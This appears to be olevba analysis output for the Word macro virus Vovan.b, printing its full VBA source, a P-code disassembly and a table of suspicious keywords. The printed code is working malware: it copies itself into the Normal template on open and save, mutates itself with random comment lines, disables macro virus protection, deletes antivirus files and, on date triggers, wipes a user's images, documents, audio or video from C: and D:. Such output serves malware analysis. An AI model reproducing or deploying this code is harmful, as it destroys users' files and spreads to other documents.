olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vovan.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vovan.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xxx.bas 
in file: Virus.MSWord.Vovan.b - OLE stream: 'Macros/VBA/xxx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Polymorphic
Application.ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub AutoExit()
On Error Resume Next
Application.ScreenUpdating = False
Options.SaveNormalPrompt = False
If Day(Now()) = Month(Now()) Then Call Abc
If Day(Now()) = Minute(Now()) Then Call Abc
If Day(Now()) = Hour(Now()) Then Call Abc
If Day(Now()) = WeekDay(Now()) Then Call Abc
If Hour(Now()) = Minute(Now()) Then Call Abc
If Hour(Now()) = WeekDay(Now()) Then Call Abc
If Hour(Now()) = Month(Now()) Then Call Abc
If Minute(Now()) = Month(Now()) Then Call Abc
If Minute(Now()) = WeekDay(Now()) Then Call Abc
If Month(Now()) = WeekDay(Now()) Then Call Abc
Options.VirusProtection = True
End Sub
Sub AutoExec()
On Error Resume Next
Options.VirusProtection = False
End Sub
Sub FileOpen()
On Error Resume Next
WordBasic.DisableAutoMacros
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Call FileSave
End Sub
Sub FileSave()
On Error Resume Next
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
Polymorphic
Rem 242,9122    8,509574    159,9063    121,7117    0,7694919
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
Polymorphic
Rem 73,00089    13,02573    103,4539    73,81318    20,22557
Dialogs(wdDialogFileSaveAs).Show
End Sub
Rem 173,8149    24,07764    151,7714    176,3693    19,66734
Sub ToolsMacro()
Rem 283,327 51,8257 42,20687    50,28157    40,66028
Call AntiAvp
End Sub
Sub FileTemplates()
Call AntiAvp
End Sub
Sub ViewVBcode()
Call AntiAvp
End Sub
Sub Organizer()
Call AntiAvp
Rem 238,8151    61,36893    8,560724    106,6425    22,9663
End Sub
Sub ToolsRecordMacroStart()
Call AntiAvp
End Sub
Sub ToolsRecordMacroToggle()
Call AntiAvp
End Sub
Sub Polymorphic()
On Error Resume Next
xXxX = Int(Rnd() * 6 + 1)
For Mutagen = 1 To xXxX
ZzZz = Application.VBE.ActiveVBProject.VBComponents("xxx").CodeModule.CountOfLines
qwer = Int(Rnd() * ZzZz + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: D = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("xxx").CodeModule.InsertLines qwer, "Rem " & a & vbTab & b & vbTab & c & vbTab & D & vbTab & e
Next Mutagen
End Sub
Sub Abc()
On Error Resume Next
Dim D
Rem 263,681 23,165  48,31168    139,4532    0,6868644
Randomize
D = Int((4 * Rnd) + 1)
If D = 1 Then GoTo Picture
If D = 2 Then GoTo Sound
If D = 3 Then GoTo Video
If D = 4 Then End
Picture:
Rem 45,52377    8,241811    127,8215    51,20645    2,236809
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
Rem 448,6724    72,87714    36,29856    125,1208    48,02016
fs.SearchSubFolders = True
fs.FileName = "*.jpg ; *.bmp ; *.gif ; *.pcx ; *.png ; *.tif ; *.tga ; *.psd ; *.pdd ; *.iff ; *.rle ; *.eps ; *.fpx ; *.jpe ; *.ani ; *.ico ; *.cur ; *.wif ; *.dcx ; *.lbm ; *.wmf ; *.pif"
fs.Execute
For G = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(G), 0
Kill fs.FoundFiles(G)
Next G
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.pdf ; *.pct ; *.pic ; *.pxr ; *.rng ; *.raw ; *.sct ; *.vda ; *.icb ; *.vst ; *.xfp ; *.xfd ; *.lpi ; *.ans ; *.rip ; *.icl ; *.pcd ; *.xif ; *.dib ; *.jif ; *.awd ; *.lnk"
fs.Execute
For Y = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(Y), 0
Kill fs.FoundFiles(Y)
Next Y
GoTo 1
Sound:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.wav ; *.mid ; *.rmi ; *.mod ; *.snd ; *.stm ; *.s3m ; *.voc ; *.mtm ; *.mpg ; *.mp2 ; *.mp3"
fs.Execute
For J = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(J), 0
Kill fs.FoundFiles(J)
Next J
GoTo 1
Video:
Rem 370,593 56,72303    7,256441    74,52589    42,26835
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.avi ; *.dvp ; *.mov ; *.flc ; *.fli ; *.flx ; *.mpg ; *.c3d ; *.c2d"
Rem 169,959 76,95625    139,4313    10,12263    46,52827
fs.Execute
For O = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(O), 0
Kill fs.FoundFiles(O)
Next O
1:
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Мой компьютер" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Наш компьютер"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = "Наш компьютер"
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "My computer" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Our computer"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = "Our computer"
End If
End Sub
Sub ToolsOptions()
On Error Resume Next
With Options: .VirusProtection = True: End With
With Options: .SaveNormalPrompt = True: End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options: .VirusProtection = False: End With
End Sub
Sub AntiAvp()
On Error Resume Next
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "avp*.* ; *.avc ; drweb*.*"
fs.Execute
For Z = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(Z), 0
Kill fs.FoundFiles(Z)
Next Z
End Sub
'***************************************
'* Author of given MacroVirus is VOVAN *
'*         MacroVirus.Word97           *
'*         Name of SuperNova           *
'*             Ver 1.0                 *
'***************************************

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vovan.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/xxx - 13683 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	ArgsCall Polymorphic 0x0000 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "xxx"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #6:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Sub AutoExit())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #13:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #14:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #15:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #16:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #18:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #19:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #20:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #22:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub AutoExec())
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub FileOpen())
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #31:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemCall EnableAutoMacros 0x0000 
' Line #33:
' 	ArgsCall (Call) FileSave 0x0000 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub FileSave())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #38:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "xxx"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	ArgsCall Polymorphic 0x0000 
' Line #40:
' 	Rem 0x003A " 242,9122    8,509574    159,9063    121,7117    0,7694919"
' Line #41:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub FileSaveAs())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "xxx"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	ArgsCall Polymorphic 0x0000 
' Line #47:
' 	Rem 0x0039 " 73,00089    13,02573    103,4539    73,81318    20,22557"
' Line #48:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #49:
' 	EndSub 
' Line #50:
' 	Rem 0x0039 " 173,8149    24,07764    151,7714    176,3693    19,66734"
' Line #51:
' 	FuncDefn (Sub ToolsMacro())
' Line #52:
' 	Rem 0x0031 " 283,327 51,8257 42,20687    50,28157    40,66028"
' Line #53:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub FileTemplates())
' Line #56:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub ViewVBcode())
' Line #59:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub Organizer())
' Line #62:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #63:
' 	Rem 0x0038 " 238,8151    61,36893    8,560724    106,6425    22,9663"
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub ToolsRecordMacroStart())
' Line #66:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #69:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub Polymorphic())
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0006 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St xXxX 
' Line #74:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld xXxX 
' 	For 
' Line #75:
' 	LitStr 0x0003 "xxx"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ZzZz 
' Line #76:
' 	ArgsLd Rnd 0x0000 
' 	Ld ZzZz 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St qwer 
' Line #77:
' 	Ld Rnd 
' 	LitDI2 0x01C7 
' 	Mul 
' 	St a 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0050 
' 	Mul 
' 	St B 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00A0 
' 	Mul 
' 	St c 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00B4 
' 	Mul 
' 	St D 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0031 
' 	Mul 
' 	St e 
' Line #78:
' 	Ld qwer 
' 	LitStr 0x0004 "Rem "
' 	Ld a 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld B 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld c 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld D 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0003 "xxx"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub Abc())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	Dim 
' 	VarDefn D
' Line #84:
' 	Rem 0x0032 " 263,681 23,165  48,31168    139,4532    0,6868644"
' Line #85:
' 	ArgsCall Read 0x0000 
' Line #86:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St D 
' Line #87:
' 	Ld D 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Picture 
' 	EndIf 
' Line #88:
' 	Ld D 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sound 
' 	EndIf 
' Line #89:
' 	Ld D 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Video 
' 	EndIf 
' Line #90:
' 	Ld D 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #91:
' 	Label Picture 
' Line #92:
' 	Rem 0x0039 " 45,52377    8,241811    127,8215    51,20645    2,236809"
' Line #93:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #94:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #95:
' 	Rem 0x0039 " 448,6724    72,87714    36,29856    125,1208    48,02016"
' Line #96:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #97:
' 	LitStr 0x00AD "*.jpg ; *.bmp ; *.gif ; *.pcx ; *.png ; *.tif ; *.tga ; *.psd ; *.pdd ; *.iff ; *.rle ; *.eps ; *.fpx ; *.jpe ; *.ani ; *.ico ; *.cur ; *.wif ; *.dcx ; *.lbm ; *.wmf ; *.pif"
' 	Ld fs 
' 	MemSt FileName 
' Line #98:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #99:
' 	StartForVariable 
' 	Ld G 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #100:
' 	Ld G 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #101:
' 	Ld G 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #102:
' 	StartForVariable 
' 	Ld G 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #104:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #105:
' 	LitStr 0x00AD "*.pdf ; *.pct ; *.pic ; *.pxr ; *.rng ; *.raw ; *.sct ; *.vda ; *.icb ; *.vst ; *.xfp ; *.xfd ; *.lpi ; *.ans ; *.rip ; *.icl ; *.pcd ; *.xif ; *.dib ; *.jif ; *.awd ; *.lnk"
' 	Ld fs 
' 	MemSt FileName 
' Line #106:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #107:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #108:
' 	Ld Y 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #109:
' 	Ld Y 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #110:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #111:
' 	GoTo 1 
' Line #112:
' 	Label Sound 
' Line #113:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #114:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #115:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #116:
' 	LitStr 0x005D "*.wav ; *.mid ; *.rmi ; *.mod ; *.snd ; *.stm ; *.s3m ; *.voc ; *.mtm ; *.mpg ; *.mp2 ; *.mp3"
' 	Ld fs 
' 	MemSt FileName 
' Line #117:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #118:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #119:
' 	Ld J 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #120:
' 	Ld J 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #121:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #122:
' 	GoTo 1 
' Line #123:
' 	Label Video 
' Line #124:
' 	Rem 0x0035 " 370,593 56,72303    7,256441    74,52589    42,26835"
' Line #125:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #126:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #127:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #128:
' 	LitStr 0x0045 "*.avi ; *.dvp ; *.mov ; *.flc ; *.fli ; *.flx ; *.mpg ; *.c3d ; *.c2d"
' 	Ld fs 
' 	MemSt FileName 
' Line #129:
' 	Rem 0x0035 " 169,959 76,95625    139,4313    10,12263    46,52827"
' Line #130:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #131:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #132:
' 	Ld O 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #133:
' 	Ld O 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #134:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #136:
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000D "Мой компьютер"
' 	Eq 
' 	IfBlock 
' Line #137:
' 	LitStr 0x000D "Наш компьютер"
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #138:
' 	LitStr 0x000D "Наш компьютер"
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x000B "DisplayName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000B "My computer"
' 	Eq 
' 	IfBlock 
' Line #141:
' 	LitStr 0x000C "Our computer"
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #142:
' 	LitStr 0x000C "Our computer"
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x000B "DisplayName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub ToolsOptions())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	EndWith 
' Line #148:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #149:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	EndWith 
' Line #152:
' 	EndSub 
' Line #153:
' 	FuncDefn (Sub AntiAvp())
' Line #154:
' 	OnError (Resume Next) 
' Line #155:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #156:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #157:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #158:
' 	LitStr 0x0019 "avp*.* ; *.avc ; drweb*.*"
' 	Ld fs 
' 	MemSt FileName 
' Line #159:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #160:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #161:
' 	Ld Z 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #162:
' 	Ld Z 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #163:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #164:
' 	EndSub 
' Line #165:
' 	QuoteRem 0x0000 0x0027 "***************************************"
' Line #166:
' 	QuoteRem 0x0000 0x0027 "* Author of given MacroVirus is VOVAN *"
' Line #167:
' 	QuoteRem 0x0000 0x0027 "*         MacroVirus.Word97           *"
' Line #168:
' 	QuoteRem 0x0000 0x0027 "*         Name of SuperNova           *"
' Line #169:
' 	QuoteRem 0x0000 0x0027 "*             Ver 1.0                 *"
' Line #170:
' 	QuoteRem 0x0000 0x0027 "***************************************"
' Line #171:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
